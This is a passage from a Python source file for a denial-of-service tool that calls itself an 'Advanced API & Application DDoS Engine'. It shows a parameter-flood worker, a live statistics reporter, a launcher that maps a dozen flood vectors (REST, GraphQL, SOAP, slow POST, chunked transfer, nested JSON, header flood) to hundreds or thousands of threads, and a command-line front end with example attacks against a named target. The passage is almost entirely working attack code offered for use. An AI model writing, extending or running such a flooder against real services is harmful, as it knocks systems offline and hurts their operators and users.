                path = f"{base_path}?{urllib.parse.urlencode(params)}"
                
                request = self.request_builder.build_rest_request("GET", path)
                success, rt, status, size = self._send_and_receive(conn, request, timeout=15)
                
                if success:
                    self.stats.record_success('parameter_flood', rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('parameter_flood', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('parameter_flood', type(e).__name__)
                time.sleep(0.01)
    
    def _stats_reporter(self):
        """Real-time statistics reporter"""
        while self.running:
            stats = self.stats.get_summary()
            
            sys.stdout.write(
                f"\r[+] {datetime.now().strftime('%H:%M:%S')} | "
                f"Time: {stats['elapsed']:.0f}s | "
                f"Requests: {stats['total_requests']} | "
                f"Rate: {stats['rate']:.0f}/s | "
                f"Success: {stats['successful']} | "
                f"Failed: {stats['failed']} | "
                f"Avg RT: {stats['avg_response_time']*1000:.1f}ms   "
            )
            sys.stdout.flush()
            time.sleep(0.5)
    
    def launch(self, vector):
        """Launch attack with specified vector"""
        if not self._test_target():
            logger.error("[-] Attack aborted - target unreachable")
            return
        
        logger.info(f"[!] Starting {vector.value} attack")
        logger.info(f"[!] Target: {self.target}:{self.port} | Threads: {self.threads} | Duration: {self.duration}s")
        
        # Start reporter thread
        reporter = threading.Thread(target=self._stats_reporter, daemon=True)
        reporter.start()
        
        # Map vectors to workers
        workers = {
            AttackVector.REST_FLOOD: self._rest_flood_worker,
            AttackVector.GRAPHQL_FLOOD: self._graphql_flood_worker,
            AttackVector.SOAP_FLOOD: self._soap_flood_worker,
            AttackVector.JSON_RPC_FLOOD: self._jsonrpc_flood_worker,
            AttackVector.SLOW_POST: self._slow_post_worker,
            AttackVector.CHUNKED_TRANSFER: self._chunked_worker,
            AttackVector.NESTED_JSON_FLOOD: self._nested_json_worker,
            AttackVector.LARGE_PAYLOAD: self._large_payload_worker,
            AttackVector.MULTIPART_FLOOD: self._multipart_worker,
            AttackVector.HEADER_FLOOD: self._header_flood_worker,
            AttackVector.PARAMETER_FLOOD: self._parameter_flood_worker,
            AttackVector.API_FLOOD: self._rest_flood_worker,
        }
        
        worker_func = workers.get(vector)
        if not worker_func:
            logger.error(f"[-] Unknown vector: {vector}")
            return
        
        # Launch threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker_func, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for duration
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            logger.info("\n[!] Interrupted by user")
        finally:
            self.running = False
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=2)
        
        # Cleanup
        self.connection_pool.close_all()
        
        # Final stats
        stats = self.stats.get_summary()
        logger.info("\n[!] Attack Complete")
        logger.info(f"    Duration: {stats['elapsed']:.2f}s")
        logger.info(f"    Total Requests: {stats['total_requests']}")
        logger.info(f"    Successful: {stats['successful']}")
        logger.info(f"    Failed: {stats['failed']}")
        logger.info(f"    Average Rate: {stats['rate']:.0f} req/s")
        logger.info(f"    Avg Response Time: {stats['avg_response_time']*1000:.1f}ms")
        
        if stats['http_codes']:
            logger.info(f"    HTTP Status Codes: {stats['http_codes']}")

# ==================== MAIN CONTROLLER ====================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Advanced API & Application DDoS Engine v3.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Vectors:
  api_flood        - Generic API endpoint flood
  rest_flood       - REST API flood (GET/POST/PUT/DELETE)
  graphql_flood    - GraphQL API flood with complex queries
  soap_flood       - SOAP API flood
  json_rpc_flood   - JSON-RPC 2.0 flood
  slow_post        - Slow POST attack (connection exhaustion)
  chunked_transfer - Chunked transfer encoding attack
  nested_json_flood- Deeply nested JSON payloads
  large_payload    - Extremely large request bodies
  multipart_flood  - Multipart form-data flood
  header_flood     - Excessive HTTP headers
  parameter_flood  - URL parameter overload
  mixed            - Random combination of all vectors

Examples:
  python3 api_ddos.py api.example.com -p 443 -s -v rest_flood -t 1000 -d 120
  python3 api_ddos.py 192.168.1.100 -p 8080 -v graphql_flood -t 500
  python3 api_ddos.py target.com -v mixed -t 2000 -d 300
        """
    )
    
    parser.add_argument('target', help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-t', '--threads', type=int, default=500, help='Number of threads (default: 500)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds (default: 60)')
    parser.add_argument('-s', '--ssl', action='store_true', help='Use HTTPS/SSL')
    parser.add_argument('-v', '--vector', default='api_flood', help='Attack vector (default: api_flood)')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    
    args = parser.parse_args()
    
    if args.debug:
        config.debug = True
        logger.setLevel(logging.DEBUG)
    
    # Validate target
    try:
        ipaddress.ip_address(args.target)
        target = args.target
    except ValueError:
        try:
            target = socket.gethostbyname(args.target)
            logger.info(f"[+] Resolved {args.target} to {target}")
        except socket.gaierror:
            logger.error(f"[-] Cannot resolve: {args.target}")
            sys.exit(1)
    
    # Parse vector
    vector_map = {v.value: v for v in AttackVector}
    vector = vector_map.get(args.vector.lower())
    
    if not vector:
        logger.error(f"[-] Unknown vector: {args.vector}")
        logger.info(f"Available vectors: {', '.join(v.value for v in AttackVector)}")
        sys.exit(1)
    
    use_ssl = args.ssl or args.port == 443
    
    if vector == AttackVector.MIXED:
        # Launch multiple vectors simultaneously
        vectors = [
            AttackVector.REST_FLOOD,
            AttackVector.GRAPHQL_FLOOD,
            AttackVector.NESTED_JSON_FLOOD,
            AttackVector.HEADER_FLOOD,
            AttackVector.SLOW_POST,
            AttackVector.CHUNKED_TRANSFER
        ]
        
        threads_per = args.threads // len(vectors)
        executors = []
        
        for v in vectors:
            executor = AttackExecutor(target, args.port, use_ssl, threads_per, args.duration)
            thread = threading.Thread(target=executor.launch, args=(v,), daemon=True)
            thread.start()
            executors.append((executor, thread))
        
        try:
            time.sleep(args.duration)
        except KeyboardInterrupt:
            logger.info("\n[!] Interrupted")
        
        for executor, _ in executors:
            executor.running = False
        
        logger.info("[!] Mixed attack completed")
    else:
        executor = AttackExecutor(target, args.port, use_ssl, args.threads, args.duration)
        executor.launch(vector)

if __name__ == "__main__":
    main()